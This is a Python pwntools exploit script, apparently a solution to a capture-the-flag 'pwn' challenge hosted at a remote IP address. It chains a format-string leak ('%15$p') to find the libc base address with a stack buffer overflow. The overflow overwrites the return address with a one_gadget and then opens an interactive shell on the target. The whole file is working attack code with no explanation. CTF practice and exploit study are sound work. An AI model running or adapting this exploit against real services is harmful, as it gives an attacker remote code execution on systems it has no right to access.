from pwn import *
from LibcSearcher import *
import sys
remote_addr = ["49.233.15.226",8006]
libc=ELF('libc-2.31.so')
elf = ELF('pwn')
if len(sys.argv) == 1:
    context.log_level="debug" 
    #p = process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu/", "-g","1234","./stack"]) 
    #p = process(["qemu-aarch64", "-L", ".", "./stack"]) 
    p = process("./pwn")
    context(arch='amd64', os='linux')
if len(sys.argv) == 2 :
    if 'r' in sys.argv[1]:
        p = remote(remote_addr[0],remote_addr[1])
    if 'n' not in sys.argv[1]:
        context.log_level="debug" 
        context(arch = 'amd64', os = 'linux')
r = lambda : p.recv()
rl = lambda : p.recvline()
rc = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()
pr = lambda name,x : log.info(name+':'+hex(x))

#gdb.attach(p)
ru(b' :\n')
payload = b'%15$p' 
s(payload)
ru(b'Hello, ')
str = r()
leak_addr = int(str[-12:],16) 
libc_base = leak_addr - 0x24083
pr('libc_base',libc_base)
one = libc_base + 0xe3b01 # 0xe3afe 0xe3b01 0xe3b04
ru(b' :\n')
payload2 = b'a' * (0x30 + 8) + p64(one)
s(payload2)


shell()
